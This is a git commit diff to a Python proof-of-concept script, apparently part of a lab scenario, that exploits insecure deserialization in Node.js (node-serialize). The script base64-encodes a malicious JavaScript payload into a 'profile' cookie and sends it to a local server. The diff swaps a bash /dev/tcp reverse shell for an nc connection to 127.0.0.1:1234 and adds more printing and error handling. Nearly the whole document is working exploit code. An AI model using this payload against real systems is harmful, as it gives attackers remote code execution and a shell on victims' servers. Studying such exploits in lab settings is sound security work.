3f25d9618a3115b6c13405b5196c4371973b93e6
tanersarptonay <sarptonay813@gmail.com>
2024-05-01 13:08:47 +0300

    Kube

--- scenario_1/poc.py
+++ scenario_1/poc.py
@@ -11,13 +11,18 @@ import sys
 url = 'http://127.0.0.1:4242/'
 
 payload = (
-    "require('http').ServerResponse.prototype.end = (function (end) {"
-        "return function () {"
-            "['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
-            "console.log('still inside');"
-            "const { exec } = require('child_process');"
-            "exec('bash -i >& /dev/tcp/127.0.0.1/1234 0>&1');"
-        "}"
+    "require('http').ServerResponse.prototype.end = (function (end) {" +
+        "return function () {" +
+            "['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));" +
+            "console.log('still inside');" +
+            "const { exec } = require('child_process');" +
+            "exec('nc 127.0.0.1 1234', { shell: '/bin/bash' }, (error, stdout, stderr) => {" +
+                "if (error) {" +
+                    "console.error('Exec error: ' + error);" +
+                    "return;" +
+                "}" +
+            "});" +
+        "}" +
     "})(require('http').ServerResponse.prototype.end)"
 )
 
@@ -25,10 +30,12 @@ code = "_$$ND_FUNC$$_" + payload
 
 string = '{"username":"hasan", "exec": "' + code + '"}'
 cookie = {'profile': base64.b64encode(bytes(string, 'utf-8')).decode("utf-8")}
-print(cookie)
+print(cookie, '\n')
 try:
+    print('Sending payload')
     response = requests.get(url, cookies=cookie).text
+    print('Payload sent')
     print(response)
 except requests.exceptions.RequestException as e:
-    print('Oops!')
+    print('Oops! Error:', e)
     sys.exit(1)
